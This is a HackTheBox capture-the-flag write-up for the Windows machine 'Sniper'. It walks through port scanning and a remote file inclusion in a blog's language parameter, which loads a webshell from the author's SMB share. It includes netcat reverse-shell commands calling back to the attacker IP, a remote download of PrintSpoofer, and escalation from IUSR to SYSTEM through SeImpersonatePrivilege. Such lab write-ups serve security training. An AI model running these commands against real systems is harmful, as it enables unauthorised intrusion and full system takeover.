# Sniper - Medium

Target IP: **10.129.229.6**

## User Flag

Initial scan: ```sudo nmap -sC -sV -p- 10.129.229.6 -v```

Output shows RPC and SMB running on the target machine.

```
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Null sessions are not allowed.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4t2lnegjae]─[~]
└──╼ [★]$ smbclient -N -L //10.129.229.6
session setup failed: NT_STATUS_ACCESS_DENIED
```

Same for RPC...

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4t2lnegjae]─[~]
└──╼ [★]$ rpcclient -N -U '' 10.129.229.6
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

Let's scan again, this seems unusual.

The first scan somehow missed port 80.

```
Discovered open port 80/tcp on 10.129.229.6
```

Let's navigate to it.

![1](Screenshots/S_1.jpg)

Clicking on one of the options brings us to ```/blog```.

![2](Screenshots/S_2.jpg)

There is a languages dropdown that lets us select the display language. This is done by sending a GET request with a paramter that loads a php file. This could be vulnerable to LFI.

![3](Screenshots/S_3.jpg)

There is also a login page.

![4](Screenshots/S_4.jpg)

The question now is what file to try getting from the potential LFI. Assuming that the log in page is for some management portal, if we can steal a PHPSESSID for a previous user, it might be useful.

We could also try RFI. If we host a php webshell and nc.exe on a file share, we might be able to get a connection back directly.

Let's try it.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-23pelpwyqc]─[/srv/samba]
└──╼ [★]$ ls -la
total 72
drwxrwxrwx 2 nobody nogroup  4096 Oct 29 16:18 .
drwxr-xr-x 3 root   root     4096 Oct 29 16:16 ..
-rw-r--r-- 1 root   root       35 Oct 29 16:17 cmd.php
-rwxr-xr-x 1 root   root    59392 Oct 29 16:18 nc.exe
```

Running this command loads the web shell on our file share and has the command load nc.exe and initiate us a connection back.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-23pelpwyqc]─[/srv/samba]
└──╼ [★]$ curl -s -G 'http://10.129.229.6/blog/' \
  --data-urlencode 'lang=\\10.10.15.194\share\cmd.php' \
  --data-urlencode 'cmd=\\10.10.15.194\share\nc.exe -e cmd 10.10.15.194 4444'
```

We catch a shell as ```nt authority\iusr```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-23pelpwyqc]─[~]
└──╼ [★]$ rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.229.6 49679
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\blog>whoami
whoami
nt authority\iusr
```

We can't read the user flag, but it turns out ```SeImpersonatePrivilege``` is enabled for this user.

```
C:\Users>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

Let's use PrintSpoofer. First, we transfer it over to the remote machine.

```
PS C:\Users> Invoke-WebRequest -Uri "http://10.10.15.194:8000/PrintSpoofer64.exe" -OutFile "C:\Windows\Temp\PrintSpoofer64.exe"
```

Let's run the executable.

```
PS C:\Windows\Temp> .\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe 10.10.15.194 4444 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

Soon after, we catch a shell as ```nt authority\system```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-23pelpwyqc]─[~]
└──╼ [★]$ rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.229.6 49685
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

We can proceed to get the user flag from here.

## Root Flag

And the root flag as well.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
